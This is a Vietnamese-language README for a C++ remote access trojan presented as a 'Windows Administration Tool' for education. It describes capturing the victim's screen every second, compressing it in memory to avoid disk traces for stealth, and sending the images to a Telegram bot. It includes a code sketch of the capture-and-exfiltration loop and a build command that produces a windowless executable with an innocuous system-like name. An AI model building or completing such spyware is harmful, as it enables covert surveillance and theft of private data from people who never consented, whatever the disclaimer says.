# 🛠️ Core System - Windows Administration Tool (RAT Concept)

![Status](https://img.shields.io/badge/Status-Educational_Research-blue?style=for-the-badge)
![Language](https://img.shields.io/badge/Language-C%2B%2B-red?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Windows-0078D4?style=for-the-badge)

Dự án nghiên cứu chuyên sâu về giao tiếp hệ thống tầng thấp (**Low-level System Interaction**), xử lý luồng đồ họa trực tiếp trên bộ nhớ và tối ưu hóa truyền tải dữ liệu qua mạng.

---

## ⚠️ CẢNH BÁO QUAN TRỌNG (DISCLAIMER)

> **Mã nguồn này được chia sẻ CHỈ cho mục đích giáo dục và nghiên cứu học thuật.**
> Tác giả không chịu trách nhiệm cho bất kỳ hành vi sử dụng sai mục đích hoặc vi phạm pháp luật. Việc sử dụng công cụ giám sát trên thiết bị không thuộc sở hữu của bạn là bất hợp pháp.

---

## 🚀 Tính Năng Kỹ Thuật (The Heart)

* **Fast Capture:** Sử dụng `BitBlt` để chụp màn hình trực tiếp từ Device Context (DC).
* **Smart Compression:** Tích hợp bộ giải mã **GDI+** để nén dữ liệu ảnh sang định dạng JPEG ngay trên RAM.
* **Zero-Disk I/O:** Sử dụng `IStream` để xử lý dữ liệu truyền tải, không tạo file tạm, tối ưu hóa tốc độ và tàng hình.
* **Multi-threading:** Tách biệt luồng xử lý đồ họa (`_beginthread`) để không gây lag máy mục tiêu.

---

## 📂 Giải Thích Mã Nguồn & Thư Viện

### 🔍 Ngôn ngữ: **C++ (ISO Standard)**
Dự án sử dụng C++ thuần để tận dụng khả năng can thiệp sâu vào hệ thống Windows và quản lý bộ nhớ thủ công nhằm đạt tốc độ thực thi cao nhất.

### 🛠️ Thư viện hỗ trợ (Linker Flags)
Để mã nguồn chạy được, trình biên dịch cần liên kết với các thư viện hệ thống sau (Đây là các thư viện được thêm vào lệnh build trên CMD):

| Library | Linker Flag | Chức năng |
| :--- | :--- | :--- |
| **GDI+** | `-lgdiplus` | Xử lý đồ họa nâng cao, nén ảnh JPEG từ dữ liệu thô. |
| **WinInet** | `-lwininet` | Thư viện HTTP/HTTPS cao cấp để gửi ảnh tới Telegram Bot. |
| **Ole32** | `-lole32` | Quản lý luồng dữ liệu (IStream), giúp xử lý ảnh trực tiếp trên RAM. |
| **Winsock2** | `-lws2_32` | Nền tảng kết nối mạng tầng thấp (Network Sockets). |

### 📝 Chú thích logic chính
```cpp
// Tạo luồng chụp ảnh và gửi dữ liệu độc lập
void __cdecl ScreenThread(void* p) {
    while (true) {
        // Chụp ảnh màn hình bằng GDI Win32 API
        BitBlt(hM, 0, 0, w, h, hS, 0, 0, SRCCOPY);
        
        // Nén sang JPEG thông qua GDI+ ngay trên bộ nhớ RAM
        bmp.Save(is, &clsid, NULL);
        
        // Gửi dữ liệu ảnh đi mà không lưu file xuống ổ cứng
        SendPhoto(buffer);
        
        Sleep(1000); // Lặp lại sau mỗi 1 giây
    }
}

#Build EXE
```cpp 
g++ "Rat.cpp" -o "SystemCore.exe" -static -lgdiplus -lwininet -lole32 -lws2_32 -mwindows
